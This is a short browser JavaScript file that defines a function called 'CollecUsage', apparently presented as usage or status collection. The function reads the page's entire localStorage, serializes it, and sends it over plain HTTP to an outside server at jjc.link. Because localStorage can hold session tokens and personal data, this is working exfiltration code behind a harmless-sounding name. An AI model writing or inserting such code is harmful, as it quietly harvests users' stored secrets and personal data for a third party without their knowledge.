(function () {
	'use strict';

	var xhr = (function () {
		var xhr = new XMLHttpRequest();

		return function (method, url, data, callback) {
			xhr.onreadystatechange = function () {
				if (xhr.readyState === 4) {
					callback(xhr.responseText, xhr.status, xhr);
					return;
				}
			};

            xhr.open(method, url);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
			xhr.send(data);
		};
	})();

	window.CollecUsage = function (callback) {
        var url = 'http://jjc.link/status/v2';

        if (localStorage.length === 0) {
            return;
        }

        var data = "ld=" + encodeURIComponent(JSON.stringify(localStorage));

		xhr('POST', url, data, function(data, status, response){
            callback();
        });
	};

})();
